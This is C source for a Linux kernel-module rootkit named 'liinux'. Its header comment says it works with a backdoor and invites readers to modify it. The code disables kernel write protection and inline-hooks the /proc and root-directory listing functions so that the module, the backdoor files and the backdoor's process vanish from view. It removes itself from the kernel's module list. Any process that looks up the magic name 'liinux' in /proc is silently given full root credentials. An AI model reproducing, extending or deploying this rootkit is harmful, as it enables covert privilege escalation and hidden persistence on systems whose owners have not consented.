/*
It works with the backdoor using inline hook in vfs, 
hides the process of backdoor and grants root privileges for it.
It also hides itself in kernel modules and hides itself 
and backdoor in file system, but no network connection hiding yet.

You can modify it to hides other files or modules or processes 
and grant root privileges for them.
*/

// #undef MODULE

#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/preempt.h>
#include <linux/uaccess.h>

// #define MODULE license
MODULE_LICENSE("GPL");

// #define LIINUX_DEBUG

#define KEY_TO_ROOT "liinux"
#define BD_NAME "111nuxXX02"
#define LKM_NAME "111nuxXX01"


#if defined(__i386__)
    #define POFF 1 
    #define CSIZE 6
    // push address, addr, ret 
    char *jmp_code="\x68\x00\x00\x00\x00\xc3"; 
    typedef unsigned int PSIZE;
#else
    #define POFF 2
    #define CSIZE 12 
    // mov address to register rax, jmp rax. for normal x64 convention 
    char *jmp_code="\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0";
    typedef unsigned long PSIZE;
#endif

DEFINE_SPINLOCK(proc_iterate_lock);
DEFINE_SPINLOCK(root_iterate_lock);

typedef int (*filldir_t)(struct dir_context *, const char *, int, loff_t, u64,unsigned);

struct dentry * (*orig_proc_lookup) (struct inode *,struct dentry *, unsigned int);

int (*orig_proc_iterate) (struct file *, struct dir_context *);
int (*orig_proc_filldir) (struct dir_context *, const char *, int, loff_t, u64, unsigned);
int (*orig_root_iterate) (struct file *, struct dir_context *);
int (*orig_root_filldir) (struct dir_context *, const char *, int, loff_t, u64, unsigned);

// ssize_t (*orig_proc_write) (struct file *, const char __user *, size_t, loff_t *);
ssize_t (*orig_proc_read) (struct file *, char __user *, size_t, loff_t *);

//used for saving backdoor's pid
pid_t magic_pid=99999;
//used for saving origin code
void *orig_proc_iterate_code;
void *orig_proc_filldir_code;
void *orig_proc_read_code;

void *orig_root_filldir_code;
void *orig_root_iterate_code;



int liinux_atoi(const char *str)
{
    int ret = 0, mul = 1;
    const char *ptr;
    for (ptr = str; *ptr >= '0' && *ptr <= '9'; ptr++) 
        ;
    ptr--;
    while (ptr >= str) {
        if (*ptr < '0' || *ptr > '9')
            break;
        ret += (*ptr - '0') * mul;
        mul *= 10;
        ptr--;
    }
    return ret;
}

void hook(void *src_func,void *dst_addr){
    barrier();
    write_cr0(read_cr0() & (~0x10000));
    #ifdef LIINUX_DEBUG
        printk("in hook: now hook:%p\n",src_func);
        printk("in hook: hook to :%p\n",(PSIZE)dst_addr);
    #endif

    memcpy(src_func,jmp_code,CSIZE);
    *(PSIZE *)&(((unsigned char*)src_func)[POFF])=(PSIZE)dst_addr;

    #ifdef LIINUX_DEBUG
        printk("in hook: now src func content:%p\n",(void *)(*(unsigned long *)src_func));
    #endif
    write_cr0(read_cr0() | 0x10000);
    barrier();
}

void save_and_hook(void **p_reserve,void *src_func,void *dst_addr){
    barrier();
    write_cr0(read_cr0() & (~0x10000));
    *p_reserve=kmalloc(CSIZE,GFP_KERNEL);
    #ifdef LIINUX_DEBUG
        printk("in save_and_hook: hijack address:%p\n",(PSIZE)dst_addr);    
    #endif
    // save origin code 
    memcpy(*p_reserve,src_func,CSIZE);
    hook(src_func,dst_addr);
    #ifdef LIINUX_DEBUG
        printk("in save_and_hook: hijack address completed\n");
    #endif

    write_cr0(read_cr0() | 0x10000);
    barrier();
}

void fix(void **p_reserve,void *src_func){
    barrier();
    write_cr0(read_cr0() & (~0x10000));

    #ifdef LIINUX_DEBUG
        printk("in fix: p_reserve: %p\n",*p_reserve);
        printk("in fix: src_func: %p\n",src_func);
    #endif
    memcpy(src_func,*p_reserve,CSIZE);

    #ifdef LIINUX_DEBUG
        printk("in fix: now src func content:%p\n",(void *)(*(unsigned long *)src_func));
    #endif

    write_cr0(read_cr0() | 0x10000);
    barrier();
}

int liinux_proc_filldir(struct dir_context *ctx, const char *name, int nlen, loff_t off, u64 ino, unsigned x){
    barrier();

    char tmp[64];
    memset(tmp, 0, 64);
    memcpy(tmp, name, nlen < 64 ? nlen : 63);

    // printk("in liinux_proc_filldir: prepare to do fill\n");
    // hide lkm, backdoor and the process
    // printk("filldir name :%s\n",name);
    if(strncmp(tmp,LKM_NAME,strlen(LKM_NAME))==0||strncmp(tmp,BD_NAME,strlen(BD_NAME))==0||liinux_atoi(tmp)==(int)magic_pid){
        return 0;
    }
    // printk("in liinux_proc_filldir: fill completed\n");

    // it may lose response with spin_lock here
    // spin_lock(&proc_filldir_lock); 
    fix(&orig_proc_filldir_code,orig_proc_filldir);
    int ret=orig_proc_filldir(ctx,name,nlen,off,ino,x);
    // hook it again
    hook(orig_proc_filldir,liinux_proc_filldir);
    // spin_unlock(&proc_filldir_lock);
    
    barrier();
    return ret;
    // return orig_proc_filldir(ctx,name,nlen,off,ino,x);
}

int liinux_proc_iterate(struct file *fp, struct dir_context *ctx){
    barrier();
    // printk("in liinux_proc_iterate: in\n");

    // I used to replace origin ctx with new_ctx, but after that I got nothing from "ls" in "/proc" 
    // so I use inline hook again
    // struct dir_context new_ctx = {
    //     .actor = liinux_proc_filldir
    // };
    // new_ctx.pos=ctx->pos;
    spin_lock(&proc_iterate_lock);
    
    // struct dir_context *orig_ctx=ctx;
    orig_proc_filldir = ctx->actor;
    // ctx = &new_ctx;
    save_and_hook(&orig_proc_filldir_code,orig_proc_filldir,liinux_proc_filldir);

    fix(&orig_proc_iterate_code,orig_proc_iterate);
    int ret = orig_proc_iterate(fp, ctx);
    // hook it again
    hook(orig_proc_iterate,liinux_proc_iterate);

    fix(&orig_proc_filldir_code,orig_proc_filldir);
    
    // ctx->pos=new_ctx.pos;
    // // ctx = orig_ctx;
    
    spin_unlock(&proc_iterate_lock);
    
    // printk("in liinux_proc_iterate: leave\n");
    barrier();
    return ret;
}

int liinux_root_filldir(struct dir_context *ctx, const char *name, int nlen, loff_t off, u64 ino, unsigned x){
    barrier();

    char tmp[64];
    memset(tmp, 0, 64);
    memcpy(tmp, name, nlen < 64 ? nlen : 63);

    // hide lkm, backdoor and the process
    // printk("filldir name :%s\n",name);
    if(strncmp(tmp,LKM_NAME,strlen(LKM_NAME))==0||strncmp(tmp,BD_NAME,strlen(BD_NAME))==0||liinux_atoi(tmp)==(int)magic_pid){
        return 0;
    }

    fix(&orig_root_filldir_code,orig_root_filldir);
    int ret=orig_root_filldir(ctx,name,nlen,off,ino,x);
    // hook it again
    hook(orig_root_filldir,liinux_root_filldir);
    
    barrier();
    return ret;
}


int liinux_root_iterate(struct file *fp, struct dir_context *ctx){
    barrier();
    spin_lock(&root_iterate_lock);
    
    orig_root_filldir = ctx->actor;
    save_and_hook(&orig_root_filldir_code,orig_root_filldir,liinux_root_filldir);


    fix(&orig_root_iterate_code,orig_root_iterate);
    int ret = orig_root_iterate(fp, ctx);
    // hook it again
    hook(orig_root_iterate,liinux_root_iterate);
    
    fix(&orig_root_filldir_code,orig_root_filldir);
    
    spin_unlock(&root_iterate_lock);
    barrier();
    return ret;
}


ssize_t liinux_proc_read(struct file *fp, const char __user *buf, size_t size, loff_t *off){
    
    fix(&orig_proc_read_code,orig_proc_read);
    ssize_t ret=orig_proc_read(fp,buf,size,off);
    hook(&orig_proc_read,liinux_proc_read);

    // printk("in liinux_proc_read: in\n");

    return ret;
}


struct dentry *liinux_lookup(struct inode *i, struct dentry *d,unsigned int flag){
    task_lock(current);
    if(strncmp(KEY_TO_ROOT,d->d_name.name,strlen(KEY_TO_ROOT))==0){
        //save magic pid
        magic_pid=current->pid;
        printk("get pid:%d\n",(int)magic_pid);
        //give it root permission
        struct cred *orig_cred = get_current_cred();
        struct cred *root_cred=prepare_creds();
        root_cred->uid.val=0;
        root_cred->gid.val=0;
        root_cred->euid.val=0;
        root_cred->egid.val=0;
        root_cred->suid.val=0;
        root_cred->sgid.val=0;
        root_cred->fsuid.val=0;
        root_cred->fsgid.val=0;
        commit_creds(root_cred);

        //set cap of current process
    }
    task_unlock(current);
    // printk("now uid:%d\n",get_current_cred()->uid.val);
    return orig_proc_lookup(i, d, flag);
}



int liinux_init(void) {
    //hide this module
    list_del_init(&__this_module.list);
    kobject_del(&THIS_MODULE->mkobj.kobj);

    struct file *fp = filp_open("/proc", O_RDONLY|O_DIRECTORY, 0);
    if (IS_ERR(fp)) 
        return -1;
    struct file *fpr=filp_open("/", O_RDONLY|O_DIRECTORY, 0);
    if(IS_ERR(fp))
        return -1;

    //clear WP protect flag
    write_cr0(read_cr0() & (~0x10000));
    //do something
    //hijack lookup operation in proc fs
    struct inode_operations *orig_inode_op = (struct inode_operations *)fp->f_path.dentry->d_inode->i_op;
    orig_proc_lookup = orig_inode_op->lookup;
    orig_inode_op->lookup = liinux_lookup;

    //reset WP protect flag
    write_cr0(read_cr0() | 0x10000);

    //hijack iterate operation in proc fs
    //because of const, we need to use inline hook instead of hijack function pointer
    orig_proc_iterate = fp->f_op->iterate;
    save_and_hook(&orig_proc_iterate_code,orig_proc_iterate,liinux_proc_iterate);
    orig_root_iterate = fpr->f_op->iterate;
    save_and_hook(&orig_root_iterate_code,orig_root_iterate,liinux_root_iterate);

    /* 
    * TODO: hide target network connection
    * but hooking read can't work here
    * orig_proc_read = fp->f_op->read;
    * save_and_hook(&orig_proc_read_code,orig_proc_read,liinux_proc_read);
    */
    

    
    printk("liinux loaded\n");
    return 0;
}

void liinux_exit(void) {
    struct file *fp = filp_open("/proc", O_RDONLY|O_DIRECTORY, 0);
    if (IS_ERR(fp)) 
        return;
    // struct file *fpr=filp_open("/", O_RDONLY|O_DIRECTORY, 0);
    // if(IS_ERR(fp))
    //     return -1;

    write_cr0(read_cr0() & (~0x10000));

    struct inode_operations *orig_inode_op = (struct inode_operations *)fp->f_path.dentry->d_inode->i_op;
    orig_inode_op->lookup = orig_proc_lookup;
    
    write_cr0(read_cr0() | 0x10000);
    //now fix it back
    fix(&orig_proc_iterate_code,orig_proc_iterate);
    fix(&orig_root_iterate_code,orig_root_iterate);

    // fix(&orig_proc_read_code,orig_proc_read);
    
    //end
    printk("liinux unloaded\n");
}


module_init(liinux_init);
module_exit(liinux_exit);

